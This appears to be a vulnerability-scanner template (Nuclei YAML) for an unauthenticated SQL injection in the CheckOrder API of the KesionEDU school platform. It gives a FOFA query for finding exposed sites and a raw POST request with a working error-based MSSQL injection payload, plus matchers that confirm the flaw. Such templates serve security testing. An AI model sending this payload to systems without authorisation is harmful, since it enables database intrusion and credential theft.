id: kexunEDU-CheckOrder-sql-XVE-2024-1476

info:
  name: "科汛新职教网校系统KesionEDU CheckOrder 接口未授权SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: body="/KS_Inc/static/edu"
      科汛新职教网校系统KesionEDU的CheckOrder接口存在未授权的SQL注入漏洞，攻击者可通过构造恶意SQL语句实现数据库信息泄露（如管理员凭证、用户数据），并在具备高权限条件下实施服务器端恶意代码部署，进而控制目标系统。
  reference:
  - https://mp.weixin.qq.com/s/Su2vRtlw8Nx92m7pOuTY5w?token=1451506197&lang=zh_CN
  tags: KesionEDU


http:
- raw:
  - |
    POST /webapi/APP/CheckOrder HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
    Accept: application/json, text/javascript, */*; q=0.01
    Priority: u=0
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest

    {"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'qkpzq1qqkkq'
  - type: status
    status:
    - 500
